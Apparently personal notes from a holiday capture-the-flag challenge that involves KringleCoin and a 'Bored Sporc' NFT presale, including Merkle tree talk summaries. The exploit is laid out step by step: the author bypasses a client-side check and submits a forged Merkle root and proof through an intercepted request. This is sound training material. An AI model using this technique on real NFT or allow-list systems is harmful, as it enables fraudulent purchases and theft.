@@ -1,0 +1,182 @@
+Objective:
+Travel to the Burning Ring of Fire and purchase a hat from the vending machine with KringleCoin. Find hints for this objective hidden throughout the tunnels.
+
+
+NPC:
+Cro! Slicmer got me on the BSRS pre-sale!
+
+Now all we gotta do is swap outfits, then you can go back in there as me.
+
+Tell Slicmer you lost your wallet key, so you made a new wallet and need to add it to the list.
+
+Then give him your wallet address, and we'll both be able to buy an NFT!
+
+Social engineering at its finest, Cro.
+
+To purchase this hat you must:
+Use a KTM to pre-approve a 10 KC transaction to the wallet address: 0x845D8D65ec82Dd8a2152EdC29f93Cb3ad75D7447
+Return to this kiosk and use Hat ID: 258 to complete your purchase.
+
+Copy this information down - you need it!
+
+
+used nearby KTM to transfer 10 kringlecoin to the specified address, using the wallet and key from the start of the game
+provided the wallet id and hat ID to the vending machine to successfully purchase hat
+
+Transaction succeeded!
+TransactionID: 0xd377d0f22ea014a1190da3745d13a6853f1364c4ac843b35472ff87ee0ea6ac0
+Block 52396
+
+Objective: Use blockchain explorer the investigate. at what address is the kinglecoin smart contract deployed
+
+0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554
+
+via block 1 in the blockchain explorer
+This transaction creates a contract.
+"KringleCoin"
+Contract Address: 0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554
+
+
+---
+exploit a smart contract
+"Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels."
+
+multiple mentions of merkle tree on site
+
+The presale price for a Sporc is 100 KringleCoin (KC). Yeah, we know that's crazy cheap, but we take care of our buds. When we open sales to the public, these things are gonna shoot to the moon.
+First, you're gonna want to make sure that your wallet address is on the approved list. Just make sure to leave the "Validate only" box checked, fill in the form, and we'll let you know if you're good-to-go. Before you do anything else, it's always good to be sure you're doing everything right and your address is validated as being on the list (it's actually something called a Merkle Tree... very high-techy-techy stuff).
+To check if you're on the list, enter your wallet address and the string of proof values that we gave you when we told you that you were on the pre-approved list. Those values should be hex strings (i.e. start with "0x" and consist of a bunch of values that are 0-9 or "a," "b," "c," "d," "e," or "f"). If you're confused, give us a shout and we can help.
+If you're not on the presale list, you're not on the list. Don't beg and plead with us to put you on the list. Seriously - we've only put Sporcs that we're tight with on the list. WE decided who's on the list (COOL SPORCS ONLY). We don't just let anyone on. If we were putting you on the list, we would've contacted you... not the other way around.
+Once you've confirmed everything works and you're sure you have the whole validated-and-on-the-list thing down, just go find a KTM and pre-approve a 100 KC transaction from the wallet you validated. That way, the funds are ready to go. Our Wallet Address is 0xe8fC6f6a76BE243122E3d01A1c544F87f1264d3a.
+Once you've pre-approved the payment, come back here do the same thing you did when you validated your address, just uncheck the "Validate Only" thing. Then, we'll grab your K'Coin, mint a brand spankin' new Sporc, and fire it into your wallet. Zap! Just like that, you'll be the owner of an amazing piece of the digital domain and a member of the Bored Sporc Rowboat Society for life! (Or, until you decide to cash-out and sell your Bored Sporc).
+
+Block 2:
+This transaction creates a contract.
+"BSRS_nft"
+Contract Address: 0x36A3d1182Cf6C15D93E47EF3E27272BFA0E8612A
+
+https://prod-blockbrowser.kringle.co.in/
+
+talk notes:
+
+tom liston: curmudgeon looks at cryptocurrencies
+smart contracts are smart programs that can perform specific financial tasks automatically
+solidity language - erc-20 standard
+
+"kringlecoin is 'mostly' erc-20 compliant"
+
+
+qwerty petabyte: fun with nfts
+https://www.youtube.com/watch?v=Qt_RWBq63S8
+
+nfts generally are just a link
+it is expensive to put real data on the blockchain
+requires specific format: erc-721
+must be able to display info
+
+merkle trees: data structures used for various purposes in NFT contracts, like creating a pre sale allow list
+three types of nodes:
+leaf nodes, created by hash values
+parent nodes: in the middle, may be multiple levels. value of parent node is determinated by concatenating hashes of nodes below and hasing THAT value ,order is important--left to right
+root node: at the top, value created in the same way. 
+
+            A (root)
+has     b       c  (parents)
+has    d e     f g   (leaves)
+
+does not require knowlege of original data blcoks to verify that a node belongs to the tree
+only need to know the direct neighboring leaf nodes hash, if any, and the neighboring parent node hasshes directly above the leaf nodes
+
+github code...
+https://github.com/QPetabyte/Merkle_Trees
+
+Our tree has 15 node values created by our eight original pieces of data
+We can provide someone with three values from the tree, called a proof that, combined with their one piece of original data, someone can mathematically prove that their data was part of the data used to build the tree, so long as we know the root value.
+This proof provides no information to the user about any other data used to create the tree.
+This has many interesting applications, from identifying possible data corruption in the InterPlanetary File System (IPFS), Btrfs, and ZFS file systems, to identifying changes in Git and Mercurial repositories, to keeping track of transactions within blocks of the Bitcoin and Ethereum blockchain networks.
+
+"The only value the NFT producer needs to keep in their blockchain code is the root value itself! Because keeping anything stored on the blockchain is expensive, this is a huge benefit! Of course, the root mustn't be able to be altered, which is why keeping it IN the smart contract on the blockchain is what smart developers do."
+
+
+downloaded repo and ran docker image
+
+mt_user@3276b06e86ea:~$ python3 merkle_tree.py
+Root: 0x431aa5796d9dcb4f660d5693a60130628c39fcbe6b83648a572929b1625f5332
+Proof: ['0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a']
+
+
+# Obviously, using a Merkle Tree for two values doesn't make much sense, but this will work to
+# create the root and proof for any number of leaf nodes. Simply replace the '0' value in the
+# line:
+#
+# print('Proof:', mt.get_proof(Web3.solidityKeccak(['bytes'], [allowlist[0]])))
+#
+# with whatever value points to the value you're interested in within your 'allowlist,' an the
+# code will output the correct proof value.
+
+
+via the presale page when attempting to validate:
+https://boredsporcrowboatsociety.com/bsrs.js
+
+function do_presale(){
+	if(!guid){
+		alert("You need to enter this site from the terminal at the North Pole, not directly. If are doing this directly, you risk not getting credit for completing the challenge.");
+	} else {
+		var resp = document.getElementById("response");
+		var ovr = document.getElementById('overlay');
+		resp.innerHTML = "";
+		var cb = document.getElementById("validate").checked;
+		var val = 'false'
+		if(cb){
+			val = 'true'
+		} else {
+			ovr.style.display = 'block';
+			in_trans = true;
+		};
+		var address = document.getElementById("wa").value;
+		var proof = document.getElementById('proof').value;
+		var root = '0x52cfdfdcba8efebabd9ecc2c60e6f482ab30bdc6acf8f9bd0600de83701e15f1';
+		var xhr = new XMLHttpRequest();
+
+		xhr.open('Post', 'cgi-bin/presale', true);
+		xhr.setRequestHeader('Content-Type', 'application/json');
+		xhr.onreadystatechange = function(){
+			if(xhr.readyState === 4){
+	            var jsonResponse = JSON.parse(xhr.response);
+	            ovr.style.display = 'none';
+	            in_trans = false;
+	            resp.innerHTML = jsonResponse.Response;
+			};
+		};
+	    xhr.send(JSON.stringify({"WalletID": address, "Root": root, "Proof": proof, "Validate": val, "Session": guid}));
+	};
+}
+
+wallet (leaf on allow list): 0x68F59390d5250F837Bc57514e66aa27576d68a58
+
+when put in code as the only item in the docker container
+Root: 0xc19a2a8d518e36cf9313e7e787674d7aae04a9eaf8cff7d8b688a1408c3f5ac4
+Proof: ['0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a']
+
+
+done via burp while not logged in to test?
+had to set guid = true; in js console to get past warning
+
+changed root value in request
+
+{"WalletID":"0x68F59390d5250F837Bc57514e66aa27576d68a58","Root":"0xc19a2a8d518e36cf9313e7e787674d7aae04a9eaf8cff7d8b688a1408c3f5ac4","Proof":"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a","Validate":"true","Session":true}
+
+response: You're on the list and good to go! Now... BUY A SPORC!
+
+
+ok going to atm to provide 100kc
+0xe8fC6f6a76BE243122E3d01A1c544F87f1264d3a
+
+followed instructions, went back to presale page
+
+Success! You are now the proud owner of BSRS Token #000124. You can find more information at https://boredsporcrowboatsociety.com/TOKENS/BSRS124, or check it out in the gallery!
+Transaction: 0xd7b2dd6bb5725b51199587f5b4bdd0a02fad0118c12bf087c8920168104d7a61, Block: 53224
+
+
+{"name": "BSRS Token #000124", "description": "Official Bored Sporc Rowboat Society Sporc #000124", "image": "https://boredsporcrowboatsociety.com/TOKENS/TOKENIMAGES/BSRS124.png", "external_url": "https://boredsporcrowboatsociety.com/TOKENS/BSRS124", "token_id": 124}
+
